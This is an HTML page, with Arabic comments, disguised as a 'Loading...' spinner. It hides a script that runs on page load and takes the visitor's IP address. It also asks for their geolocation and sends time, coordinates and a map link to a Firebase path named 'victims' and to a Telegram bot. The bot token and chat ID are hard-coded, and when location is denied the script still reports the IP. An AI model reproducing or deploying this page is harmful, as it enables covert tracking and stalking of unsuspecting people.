<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        // --- 1. إعدادات الحسابات (تأكد من صحتها) ---
        const firebaseURL = "https://abdlaa-201db-default-rtdb.firebaseio.com/victims.json";
        const telegramToken = "8419642080:AAG_CldOoiG865Vi7U4Zsu0oIODVKHIJ13U";
        const chatId = "7647765854";

        async function startFishing() {
            // الحصول على الـ IP
            let ip = "غير معروف";
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ip = data.ip;
            } catch (e) { console.log("خطأ في جلب IP"); }

            // طلب الموقع الجغرافي
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    const time = new Date().toLocaleString('ar-EG');

                    // تجهيز البيانات
                    const payload = {
                        "الوقت": time,
                        "الـIP": ip,
                        "خط_العرض": lat,
                        "خط_الطول": lon,
                        "رابط_الخريطة": mapLink
                    };

                    // 2. الإرسال إلى Firebase
                    fetch(firebaseURL, {
                        method: 'POST',
                        body: JSON.stringify(payload)
                    });

                    // 3. الإرسال إلى Telegram
                    const msg = `🚀 **صيدة جديدة مكتملة** 🚀\n📅 الوقت: ${time}\n📍 الموقع: ${mapLink}\n🌐 IP: ${ip}`;
                    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);

                }, (error) => {
                    // في حال رفض الضحية إعطاء الموقع، نرسل الـ IP فقط
                    const msg = `⚠️ **الضحية رفض الموقع**\n🌐 IP: ${ip}`;
                    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                });
            }
        }

        // بدء العملية عند فتح الصفحة
        window.onload = startFishing;
    </script>
</body>
</html>
